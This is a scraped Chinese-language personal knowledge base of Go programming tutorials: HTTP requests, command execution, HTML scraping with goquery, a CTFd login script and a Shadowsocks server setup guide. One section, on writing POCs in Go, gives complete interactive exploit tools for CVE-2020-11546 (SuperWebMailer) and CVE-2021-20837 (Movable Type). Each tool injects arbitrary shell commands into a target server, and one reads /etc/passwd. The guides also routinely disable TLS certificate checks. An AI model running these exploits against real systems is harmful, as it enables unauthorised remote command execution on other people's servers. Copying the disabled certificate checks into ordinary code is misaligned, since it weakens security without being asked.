import ( \"fmt\" \"net/url\" ) func main() { u := \"https://admin:password@blog.gm7.org/test/point?a=123&b=test\" uu, _ := url.Parse(u) fmt.Println(uu.Scheme) fmt.Println(uu.User) fmt.Println(uu.User.Username()) fmt.Println(uu.Host) fmt.Println(uu.Path) fmt.Println(uu.Hostname()) fmt.Println(uu.Query()) } /* https admin:password admin blog.gm7.org /test/point blog.gm7.org map[a:[123] b:[test]] */ Base64 package main import ( \"encoding/base64\" \"fmt\" ) func main() { a := \"123456\" res := base64.StdEncoding.EncodeToString([] byte(a)) fmt.Println(res) // MTIzNDU2 decod, _ := base64.StdEncoding.DecodeString(res) fmt.Println(string(decod)) // 123456 } 命令行参数 从命令行获取参数，得到的是一个切片 package main import ( \"fmt\" \"os\" ) func main() { args := os.Args fmt.Println(args) } /* go run Hello.go 123 456 [/var/folders/fw/tddtsjp91wb9q64l5xt7jd540000gn/T/go-build3185553057/b001/exe/Hello 123 456] */ 执行系统命令 在 Golang 中用于执行命令的库是 os/exec，exec.Command 函数返回一个 Cmd 对象，根据不同的需求，可以将命令的执行分为三种情况 只执行命令，不获取结果 执行命令，并获取结果（不区分 stdout 和 stderr） 执行命令，并获取结果（区分 stdout 和 stderr） 只执行命令，不获取结果 直接调用Run()函数 package main import ( \"fmt\" \"os/exec\" ) func main() { res := exec.Command(\"open\", \"-na\", \"Calculator\").Run() // run会阻塞等到命令执行结束 fmt.Println(res) // } 执行命令获取结果 可以调用 cmd 的 CombinedOutput 函数 package main import ( \"fmt\" \"os/exec\" ) func main() { cmd := exec.Command(\"ls\", \"-la\") res, _ := cmd.CombinedOutput() fmt.Println(string(res)) // ls -la 执行结果 } 执行命令获取结果并区分stdout和stderr package main import ( \"bytes\" \"fmt\" \"os/exec\" ) func main() { cmd := exec.Command(\"ls\", \"-la\") var stdout, stderr bytes.Buffer cmd.Stdout = &stdout cmd.Stderr = &stderr cmd.Run() fmt.Println(string(stdout.Bytes())) // ls -la 执行结果 } 多条命令使用管道执行 就是类似shell里面|的作用，ls -la | grep go package main import ( \"fmt\" \"os\" \"os/exec\" ) func main() { cmd1 := exec.Command(\"ls\", \"-la\") cmd2 := exec.Command(\"grep\", \"go\") cmd2.Stdin, _ = cmd1.StdoutPipe() cmd2.Stdout = os.Stdout cmd2.Start() cmd1.Run() cmd2.Wait() fmt.Println(cmd2.Stdout) // ls -la | grep go 执行结果 } HTTP请求 快速发起get请求 package main import ( \"fmt\" \"io/ioutil\" \"net/http\" ) func main() { url := \"https://www.baidu.com/\" response,_ := http.Get(url) // 发起get请求 defer response.Body.Close() fmt.Println(response.StatusCode) fmt.Println(response.Header.Get(\"Server\")) body, _ := ioutil.ReadAll(response.Body) fmt.Println(string(body)) // 源码 } 收到的数据包 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 带有参数的GET请求 可以直接在上面的url后面直接构造参数，也可以通过如下的方式手动设置参数 package main import ( \"fmt\" \"net/http\" \"net/url\" ) func main() { u := \"http://baidu.com/\" Url, _ := url.Parse(u) param := url.Values{} param.Set(\"name\", \"d4m1ts\") param.Set(\"中文\", \"汉字测试\") Url.RawQuery = param.Encode() // 包含URL编码 fmt.Println(Url) // http://baidu.com/?name=d4m1ts&%E4%B8%AD%E6%96%87=%E6%B1%89%E5%AD%97%E6%B5%8B%E8%AF%95 resp,_ := http.Get(Url.String()) fmt.Println(resp.StatusCode) // 200 } 收到的数据包 GET /?name=d4m1ts&%E4%B8%AD%E6%96%87=%E6%B1%89%E5%AD%97%E6%B5%8B%E8%AF%95 HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 返回JSON的数据包 返回是json格式，如何快速格式化数据 返回的json内容 { \"args\": {}, \"headers\": { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Dnt\": \"1\", \"Host\": \"httpbin.org\", \"Sec-Gpc\": \"1\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\", \"X-Amzn-Trace-Id\": \"Root=1-61cbb6de-6e8a5d6a2710be6f22da6f92\" }, \"origin\": \"213.239.21.35\", \"url\": \"http://httpbin.org/get\" } 一样的发起http请求，只是最后用JSON来反序列化而已 package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" \"io/ioutil\" \"net/http\" ) func main() { u := \"http://httpbin.org/get\" resp, err := http.Get(u) if err == nil { // 请求成功 body, _ := ioutil.ReadAll(resp.Body) origin := jsoniter.Get(body, \"origin\") fmt.Println(origin.ToString()) // 213.239.21.35 headers := jsoniter.Get(body, \"headers\") fmt.Println(headers.Get(\"Host\").ToString()) // httpbin.org } } 自定义Header头 package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" \"io/ioutil\" \"net/http\" \"time\" ) func main() { // 创建一个HTTP请求，但是不发送请求 u := \"http://httpbin.org/get\" req, _ := http.NewRequest(\"GET\", u, nil) req.Header.Set(\"User-Agent\", \"Test GO\") req.Header.Set(\"Name\", \"d4m1ts\") // 发送刚才创建的请求 client := http.Client{ Timeout: 3*time.Second, // 超时时间 } resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) headers := jsoniter.Get(body, \"headers\") fmt.Println(headers.ToString()) } /* { \"Accept-Encoding\": \"gzip\", \"Host\": \"httpbin.org\", \"Name\": \"d4m1ts\", \"User-Agent\": \"Test GO\", \"X-Amzn-Trace-Id\": \"Root=1-61cbbb0d-68f21a6c5c36abd861b6fe99\" } */ 收到的数据包 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Test GO Name: d4m1ts Accept-Encoding: gzip 快速发起POST请求 方法一：使用http.Post，有一点点麻烦 package main import ( \"net/http\" \"strings\" ) func main() { u := \"http://127.0.0.1:8000\" http.Post(u, \"application/x-www-form-urlencoded\", strings.NewReader(\"aa=bb\")) } 收到的http请求 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Content-Length: 5 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip aa=bb 方法二：使用http.PostForm，相对简单，但是无法设置content-type，没那么自由 package main import ( \"net/http\" \"net/url\" ) func main() { u := \"http://127.0.0.1:8000\" param := url.Values{} param.Set(\"aaa\", \"bbb\") http.PostForm(u, param) } 收到的http请求 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Content-Length: 7 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip aaa=bbb 自定义POST请求 和get差不多，只不过是多了设置content-type和post数据的步骤而已 举例为发送json数据 package main import ( \"bytes\" \"encoding/json\" \"net/http\" ) func main() { // 创建请求，但是不发起 u := \"http://127.0.0.1:8000\" param := map[string]string{ \"aa\": \"bb\", \"name\": \"d4m1ts\", } buf, _ := json.Marshal(param) // 序列化的json req, _ := http.NewRequest(\"POST\", u, bytes.NewReader(buf)) req.Header.Set(\"User-Agent\", \"UA TEST\") req.Header.Set(\"Content-Type\", \"application/json\") // 发送刚才的请求 client := http.Client{} client.Do(req) } 收到的http数据包 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: UA TEST Content-Length: 27 Content-Type: application/json Accept-Encoding: gzip {\"aa\":\"bb\",\"name\":\"d4m1ts\"} 忽略证书 有些时候一些ssl网站因为证书问题也会抛出panic异常，所以一般可以忽略SSL证书，在初始化http客户端的时候忽略，代码如下 tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client := http.Client{ Transport: tr, } 参考 Golang标准库文档 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-29 17:14:52 "},"个人知识库/03.编程开发/GO/03.使用GO编写POC.html":{"url":"个人知识库/03.编程开发/GO/03.使用GO编写POC.html","title":"03.使用GO编写POC","keywords":"","body":" CVE-2020-11546 扩展1：交叉编译 扩展2：go.mod 扩展3：go get 扩展4：交互输入 代码 测试图 CVE-2021-20837 扩展5：忽略SSL证书 扩展6：正则表达式 代码 测试图 CVE-2020-11546 [!NOTE] 已上传至GitHub:https://github.com/damit5/CVE-2020-11546 扩展1：交叉编译 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_darwin CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_linux CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_win.exe 扩展2：go.mod go mod init go mod init github.com/damit5/CVE-2020-11546 不然不能go get -u自动下载编译，会出现问题 扩展3：go get 直接使用go get -u github.com/xxx可能出现版本的问题，可以使用如下命令执行版本或者分支 go get -u -v github.com/damit5/CVE-2020-11546@master [!TIP] 也可以使用@commit hash等等 http://icattlecoder.github.io/2019/03/29/go-module-and-version.html https://zhuanlan.zhihu.com/p/103534192 扩展4：交互输入 for { fmt.Printf(\"\\n\\ncommand: \") _, _ = fmt.Scanln(&command) if command != \"\" { break } } 代码 package main import ( \"bytes\" \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"strings\" ) func banner(){ fmt.Println(` .___ _____ ____ __ __| _// | | _____/_ |/ |_ ______ / __ |/ | |_/ \\| \\ __\\/ ___/ / /_/ / ^ / Y Y \\ || | \\___ \\ \\____ \\____ ||__|_| /___||__| /____ > \\/ |__| \\/ \\/ CVE-2020-11546 `) } /* * 参数检查 */ func argsCheck(args []string) { if len(args) != 2 { fmt.Printf(\"Usage:\\n\\t./%s \\n\", args[0]) os.Exit(0) } } /* * url处理 */ func urlHandler(target string) string { // 没有http前缀的添加http前缀 if !strings.HasPrefix(target, \"http\") { target = \"http://\" + target } // 有/结尾的就去掉/ if strings.HasSuffix(target, \"/\") { // 去掉后缀 / target = strings.TrimSuffix(target, \"/\") fmt.Println(target) } return target } /* * 漏洞检查 */ func check(target string) bool { // 创建请求 vulurl := target + \"/mailingupgrade.php\" req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(`step=4&Language=de%7b$%7bsystem(%22echo vultest%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E`))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"application/x-www-form-urlencoded\") // 发起请求 client := http.Client{} resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(body), \"vultest\") { return true } return false } /* * 漏洞检查 */ func exp(target string, command string) { // 创建请求 vulurl := target + \"/mailingupgrade.php\" data := `step=4&Language=de%7b$%7bsystem(%22` + command + `%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E` req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(data))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"application/x-www-form-urlencoded\") // 发起请求 client := http.Client{} resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) res := strings.Replace(string(body), \"Can't load correct language file in /language directory\", \"\", -1) res = strings.TrimSpace(res) fmt.Println(res) } func main() { args := os.Args banner() argsCheck(args) target := args[1] target = urlHandler(target) if check(target) { fmt.Printf(\"target %s is vuln\", target) var command string for { for { fmt.Printf(\"\\n\\ncommand: \") fmt.Scanln(&command) if command != \"\" { break } } exp(target, command) } } else { fmt.Printf(\"target %s is not vuln\", target) } } 测试图 CVE-2021-20837 扩展5：忽略SSL证书 [!WARNING] 这个错误不容易发现，所以需要经验来判断，在初始化客户端的时候需要忽略SSL证书 var Client http.Client tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client = http.Client{ Transport: tr, } 扩展6：正则表达式 默认情况下，.是不能匹配换行符\\n的，有时候我们有需要通过.匹配到\\n，这个时候就需要稍微修改一下.了 [!TIP] 在线正则表达式测试网站：https://regex101.com/ (?s).* 实例： 代码 package main import ( \"bytes\" \"crypto/tls\" \"encoding/base64\" \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"regexp\" \"strings\" ) // 客户端全局变量 var Client http.Client func banner(){ fmt.Println(` .___ _____ ____ __ __| _// | | _____/_ |/ |_ ______ / __ |/ | |_/ \\| \\ __\\/ ___/ / /_/ / ^ / Y Y \\ || | \\___ \\ \\____ \\____ ||__|_| /___||__| /____ > \\/ |__| \\/ \\/ CVE-2021-20837 `) } /* * 参数检查 */ func argsCheck(args []string) { if len(args) != 2 { fmt.Printf(\"Usage:\\n\\t./%s \\n\", args[0]) os.Exit(0) } } /* * url处理 */ func urlHandler(target string) string { // 没有http前缀的添加http前缀 if !strings.HasPrefix(target, \"http\") { target = \"http://\" + target } // 有/结尾的就去掉/ if strings.HasSuffix(target, \"/\") { // 去掉后缀 / target = strings.TrimSuffix(target, \"/\") fmt.Println(target) } return target } /* * 漏洞检查 */ func check(target string) bool { // 创建请求 vulurl := target + \"/cgi-bin/mt/mt-xmlrpc.cgi\" command := \"`cat /etc/passwd`\" base64_cmd := base64.StdEncoding.EncodeToString([]byte(command)) payload := fmt.Sprintf(` mt.handler_to_coderef %s `, base64_cmd) req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(payload))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"text/xml; charset=UTF-8\") // 发起请求 tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client = http.Client{ Transport: tr, } resp, _ := Client.Do(req) body, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(body), \"root:x:0\") { return true } return false } /* * 漏洞检查 */ func exp(target string, command string) { // 创建请求 vulurl := target + \"/cgi-bin/mt/mt-xmlrpc.cgi\" base64_cmd := base64.StdEncoding.EncodeToString([]byte(\"`\" + command + \"`\")) payload := fmt.Sprintf(` mt.handler_to_coderef %s `, base64_cmd) req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(payload))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"text/xml; charset=UTF-8\") // 发起请求 resp, _ := Client.Do(req) body, _ := ioutil.ReadAll(resp.Body) // 正则表达式匹配结果 regex, _ := regexp.Compile(\"Can't\\\\slocate\\\\s((?s).*)\\\\sin @INC\") res := regex.FindAllStringSubmatch(string(body), 1)[0][1] fmt.Println(res) } func main() { args := os.Args banner() argsCheck(args) target := args[1] target = urlHandler(target) if check(target) { fmt.Printf(\"target %s is vuln\", target) var command string for { for { fmt.Printf(\"\\n\\ncommand: \") _, _ = fmt.Scanln(&command) if command != \"\" { break } } exp(target, command) } } else { fmt.Printf(\"target %s is not vuln\", target) } } 测试图 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-29 17:44:33 "},"个人知识库/03.编程开发/GO/04.使用GO模拟登陆.html":{"url":"个人知识库/03.编程开发/GO/04.使用GO模拟登陆.html","title":"04.使用GO模拟登陆","keywords":"","body":" 前期准备 goquery基础用法 创建document实例 标签选择器 ID选择器 class选择器 属性选择器 内容提取 parent>child子选择器 prev+next相邻选择器 prev~next兄弟选择器 内容过滤器 :first-of-type过滤器 :nth-child(n) 过滤器系列 :only-child 过滤器系列 选择器或(|)运算 补充说明 Cookie自动保存更新 实战 前期准备 本次为了方便解析html，快速提取登陆时需要的一些数据，类似python中的bs4，而不是采用正则表达式去匹配数据，所以会用到一个新的库 goquery：https://github.com/PuerkitoBio/goquery 安装： go get -v github.com/PuerkitoBio/goquery goquery基础用法 [!NOTE] 大部分内容匹配规则和jquery类似 以 https://cloud.ctfd.io/login 页面为例 创建document实例 req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/login\", nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") client := &http.Client{} resp, _ := client.Do(req) // 参数类型为 io.Reader dom, _ := goquery.NewDocumentFromReader(resp.Body) 标签选择器 这个比较简单，就是基于a,p等这些HTML的基本元素进行选择，这种直接使用Element名称作为选择器即可。比如dom.Find(\"div\") 实例：找到所有的a标签，并循环获取值（不是属性，是标签中的值） dom.Find(\"a\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) }) Features Pricing Store Contact Login Sign Up Don't have an account? Sign Up # 和截图匹配的这一条 Forgot password? Exiting. ID选择器 通过ID定位到元素，算是最常用的之一 实例：比如我们要定位到id=\"navbarResponsive\"的元素，输出它的源码，不过需要注意的是，输出源码并不会输出当前的标签 selection := dom.Find(\"#navbarResponsive\") // selection := dom.Find(\"div#navbarResponsive\") // 同时匹配标签和id，更准确 fmt.Println(selection.Html()) Features Pricing Store Contact Login Sign Up class选择器 它的用法和ID选择器类似，为Find(\".class\") 实例：寻找所有class=\"nav-link元素，并输出他们的值 dom.Find(\".nav-link\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) }) [!TIP] 也可以组合，如 a.nav-link：寻找所有a标签且class为nav-link的元素 Features Pricing Store Contact Login Sign Up 属性选择器 上面3种有时候还不够用，这个时候就需要属性选择器来帮忙了 实例：获取input标签中属性name为nonce的元素的value值 [!Note] 就是获取红框中的值，这里放图了下面就不放了 res, exist := dom.Find(\"input[name=nonce]\").Attr(\"value\") if exist { fmt.Println(res) // YidceDA0XHhhZVx4YmE9XHgxNFx4MTVceDhlXHgxNC9ceGUyJw== } 补充： 除了完全相等，还有其他匹配方式，使用方式类似，这里统一列举下，不再举例 选择器 说明 Find(\"div[lang]\") 筛选含有lang属性的div元素 Find(\"div[lang=zh]\") 筛选lang属性为zh的div元素 Find(\"div[lang!=zh]\") 筛选lang属性不等于zh的div元素 Find(\"div[lang¦=zh]\") 筛选lang属性为zh或者zh-开头的div元素 Find(\"div[lang*=zh]\") 筛选lang属性包含zh这个字符串的div元素 Find(\"div[lang~=zh]\") 筛选lang属性包含zh这个单词的div元素，单词以空格分开的 Find(\"div[lang$=zh]\") 筛选lang属性以zh结尾的div元素，区分大小写 Find(\"div[lang^=zh]\") 筛选lang属性以zh开头的div元素，区分大小写 以上是属性筛选器的用法，都是以一个属性筛选器为例，当然你也可以使用多个属性筛选器组合使用，比如： Find(\"div[id][lang=zh]\"),用多个中括号连起来即可。当有多个属性筛选器的时候，要同时满足这些筛选器的元素才能被筛选出来 内容提取 获取到了标签，当然就像获取到里面的值了 parent>child子选择器 [!NOTE] 上面的基本都够用了，这里再列举一些可能会用到的筛选器 如果我们想筛选出某个元素下符合条件的子元素，我们就可以使用子元素筛选器，它的语法为Find(\"parent>child\"),表示筛选parent这个父元素下，符合child这个条件的最直接（一级）的子元素。 实例：form标签下的input标签的属性value的值 res, exist := dom.Find(\"form>input\").Attr(\"value\") if exist { fmt.Println(res) // YiJceGU0YTxceGY3alx4MGYnVVx4ZDdceGNlIg== } prev+next相邻选择器 假设我们要筛选的元素没有规律，但是该元素的上一个元素有规律，我们就可以使用这种下一个相邻选择器来进行选择。 实例：h2标签旁边的p标签的值 [!TIP] 如果class的值存在空格，那么可以用属性的格式来匹配，防止空格影响结果 dom.Find(\"h2[class='block-title text-center']+p.text-center\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) // Don't have an account? Sign Up }) prev~next兄弟选择器 有相邻就有兄弟，兄弟选择器就不一定要求相邻了，只要他们共有一个父元素就可以。 实例：获取lable标签的兄弟标签input dom.Find(\"label~input\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Attr(\"name\")) // email true }) 内容过滤器 有时候我们使用选择器选择出来后，希望再过滤一下，这时候就用到过滤器了 实例：获取包含内容Email的label标签 dom.Find(\"label:contains(Email)\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) // Email Address }) 扩展： Find(\":contains(text)\")表示筛选出的元素要包含指定的文本 Find(\":empty\")表示筛选出的元素都不能有子元素（包括文本元素），只筛选那些不包含任何子元素的元素 Find(\":has(selector)\")和contains差不多，只不过这个是包含的是元素节点 :first-of-type过滤器 :first-child选择器限制的比较死，必须得是第一个子元素，如果该元素前有其他在前面，就不能用:first-child了，这时候:first-of-type就派上用场了，它要求只要是这个类型的第一个就可以 实例：输出第一个div标签的源码 ret, _ := dom.Find(\"div:first-of-type\").Html() fmt.Println(ret) 扩展： :last-child 和 :last-of-type过滤器正好和上面的2歌过滤器相反，表示最后一个过滤器 :nth-child(n) 过滤器系列 表示筛选出的元素是其父元素的第n个元素，n以1开始。所以我们可以知道:first-child和:nth-child(1)是相等的。通过指定n，我们就很灵活的筛选出我们需要的元素 同样，:nth-of-type(n)和 :nth-child(n) 类似，只不过它表示的是同类型元素的第n个,所以:nth-of-type(1) 和 :first-of-type是相等的 nth-last-child(n) 和:nth-last-of-type(n) 过滤器是倒序开始计算的，最后一个元素被当成了第一个 [!WARNING] 都不举例了，没必要 :only-child 过滤器系列 Find(\":only-child\") 过滤器，从字面上看，可以猜测出来，它表示筛选的元素，在其父元素中，只有它自己，它的父元素没有其他子元素，才会被匹配筛选出来。 :only-of-type 过滤器和其他的类似，同类型元素只要只有一个，就可以被筛选出来 选择器或(|)运算 如果我们想同时筛选出div,span等元素怎么办？这时候可以采用多个选择器进行组合使用，并且以逗号(,)分割，Find(\"selector1, selector2, selectorN\")表示，只要满足其中一个选择器就可以被筛选出来，也就是选择器的或(|)运算操作。 实例：筛选出所有的meta标签和input标签，并且获取到其属性name的值 dom.Find(\"meta,input\").Each(func(i int, selection *goquery.Selection) { val, exists := selection.Attr(\"name\") if exists { fmt.Println(val) } }) viewport description author twitter:card twitter:site twitter:creator twitter:title twitter:description twitter:image email password nonce 补充说明 1、类似函数的位置操作 方法 说明 Find(selection) *Selection 根据选择器查找节点集 Eq(index int) *Selection 根据索引获取某个节点集 First() *Selection 获取第一个子节点集 Last() *Selection 获取最后一个子节点集 Next() *Selection 获取下一个兄弟节点集 NextAll() *Selection 获取后面所有兄弟节点集 Prev() *Selection 前一个兄弟节点集 Get(index int) *html.Node 根据索引获取一个节点 Index() int 返回选择对象中第一个元素的位置 Slice(start, end int) *Selection 根据起始位置获取子节点集 2、循环遍历选择的节点 方法 说明 Each(f func(int, *Selection)) *Selection 遍历 EachWithBreak(f func(int, *Selection) bool) *Selection 可中断遍历 Map(f func(int, *Selection) string) (result []string) 返回字符串数组 3、检测或获取节点属性值 方法 说明 Attr(), RemoveAttr(), SetAttr() 获取，移除，设置属性的值 AddClass(), HasClass(), RemoveClass(), ToggleClass() 类相关 Html() 获取该节点的html Length() 返回该Selection的元素个数 Text() 获取该节点的文本值 4、 在文档树之间来回跳转（常用的查找节点方法） 方法 说明 Children() 返回selection中各个节点下的孩子节点 Contents() 获取当前节点下的所有节点 Find() 查找获取当前匹配的元素 Next() 下一个元素 Prev() 上一个元素 Cookie自动保存更新 [!NOTE] 大家都知道，网站登陆后肯定有个用来鉴权的东西，而Cookie和token居多，这里我们讲一下用Cookie [!DANGER] 网上直接搜go模拟登陆，但是出来的代码都是登陆后手动设置req的cookie，而不会自动的更新cookie，既然python里面都有request.Session，那golang里面肯定也有类似的东西吧！ 结合之前的经验，发现在创建客户端的时候，会传入一个CookieJar，这玩意儿根据经验肯定是用来存放Cookie的 试一下便知 根据经验，第一次访问百度的时候，百度会给咱们分配cookie，那咱们就可以用它来试试能不能自动保存更新Cookie 然后根据它的参数构造一个CookieJar出来 jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) 再创建个http客户端给它放进去，发起请求，查看结果 package main import ( \"fmt\" \"golang.org/x/net/publicsuffix\" \"net/http\" \"net/http/cookiejar\" ) func main() { // 创建客户端 jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client := http.Client{Jar: jar} fmt.Printf(\"访问前：\\n\") fmt.Println(client.Jar) client.Get(\"https://www.baidu.com\") fmt.Printf(\"\\n\\n访问后：\\n\") fmt.Println(client.Jar) } 可以看到我们的Cookie成功自动保存了，那就说明之前的猜想是对的 后面对百度发起访问，就会自动带上Cookie了 实战 实战模拟登陆CTFD平台：https://cloud.ctfd.io/login 主要分为3步： 获取nonce 登陆 验证登陆是否成功 完整代码： package main import ( \"fmt\" \"github.com/PuerkitoBio/goquery\" \"golang.org/x/net/publicsuffix\" \"io/ioutil\" \"net/http\" \"net/http/cookiejar\" \"net/url\" \"strings\" ) // 登陆账号密码 var Config = map[string]string{ \"email\": \"yeciyar420@zherben.com\", \"passwd\": \"xxxxx\", } // 登陆客户端 var Client http.Client /* * 1. 获取登陆需要的Nonce，同时初始化客户端 */ func getNonce() string { req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/login\", nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") // 初始化client jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) Client = http.Client{Jar: jar} resp, _ := Client.Do(req) dom, _ := goquery.NewDocumentFromReader(resp.Body) val, _ := dom.Find(\"input[name=nonce]\").Attr(\"value\") return val } /* * 2. 登陆 */ func login(nonce string) (bool) { // 构造请求 param := url.Values{} param.Set(\"email\", Config[\"email\"]) param.Set(\"password\", Config[\"passwd\"]) param.Set(\"nonce\", nonce) data := param.Encode() req, _ := http.NewRequest(\"POST\", \"https://cloud.ctfd.io/login\", strings.NewReader(data)) req.Header.Set(\"authority\", \"cloud.ctfd.io\") req.Header.Set(\"content-type\", \"application/x-www-form-urlencoded\") req.Header.Set(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") req.Header.Set(\"referer\", \"https://cloud.ctfd.io/admin\") // 发起请求 resp, _ := Client.Do(req) source, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(source), \"Your password is wrong\"){ fmt.Println(\"账号或密码错误\") return false } else { return true } } /* * 3. 验证是否登陆成功 */ func getInfo() { req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/profile\", nil) req.Header.Set(\"authority\", \"cloud.ctfd.io\") req.Header.Set(\"content-type\", \"application/x-www-form-urlencoded\") req.Header.Set(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") req.Header.Set(\"referer\", \"https://cloud.ctfd.io/admin\") resp, _ := Client.Do(req) if resp.StatusCode == 200 { dom, _ := goquery.NewDocumentFromReader(resp.Body) val, exists := dom.Find(\"#name-input\").Attr(\"value\") if exists { fmt.Printf(\"Success, Login as %s\\n\", val) } } } func main() { nonce := getNonce() fmt.Println(\"Nonce: \", nonce) res := login(nonce) if res { fmt.Println(\"登陆成功，尝试获取个人信息...\") getInfo() } } 效果： Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-31 17:53:52 "},"个人知识库/04.暂未分类/01.代理类/Linux下搭建ShadowSocks服务器.html":{"url":"个人知识库/04.暂未分类/01.代理类/Linux下搭建ShadowSocks服务器.html","title":"Linux下搭建ShadowSocks服务器","keywords":"","body":" 安装SS服务端 CentOS Debian/Ubuntu 配置ShadowSocks 启动Shadowsocks服务端 客户端连接服务端 配置 成功截图 其他 疑难杂症 同类产品 安装SS服务端 CentOS 执行命令 # 安装 python setup tools yum install python-setuptools -y #安装pip easy_install pip #升级 pip pip install –upgrade pip #安装 shadowsocks pip install shadowsocks 单独汇总一下，方便直接复制粘贴 yum install python-setuptools -y easy_install pip pip install –upgrade pip pip install shadowsocks Debian/Ubuntu apt-get install python-pip # 国内源都删了 pip install shadowsocks -i https://pypi.python.org/simple/ 有时 Ubuntu 会遇到第一个命令安装 python-pip 时找不到包的情况。pip 官方给出了一个安装脚本，可以自动安装 pip。先下载脚本，然后执行即可： wget https://bootstrap.pypa.io/get-pip.py python get-pip.py 配置ShadowSocks 创建配置文件 vi /etc/shadowsocks.json 然后输入如下内容 { \"server\":\"0.0.0.0\", \"server_port\":10010, \"password\":\"your_password\", \"timeout\":300, \"method\":\"rc4-md5\", \"fast_open\":true, \"workers\": 1 } 代码中各字段的含义 字段 说明 server 服务器 IP地址 (IPv4/IPv6) server_port 服务器监听的端口，一般设为80，443等，注意不要设为使用中的端口 password 设置密码，自定义 timeout 超时时间（秒） method 加密方法，可选择 “aes-256-cfb”,“rc4-md5”等等。推荐使用 “rc4-md5” fast_open true 或 false。如果你的服务器 Linux 内核在3.7+，可以开启 fast_open 以降低延迟。 workers workers数量，默认为 1。 启动Shadowsocks服务端 ssserver -c /etc/shadowsocks.json screen -dmS ssserver ssserver -c /etc/shadowsocks.json 启动可能会出现错误AttributeError: /lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: 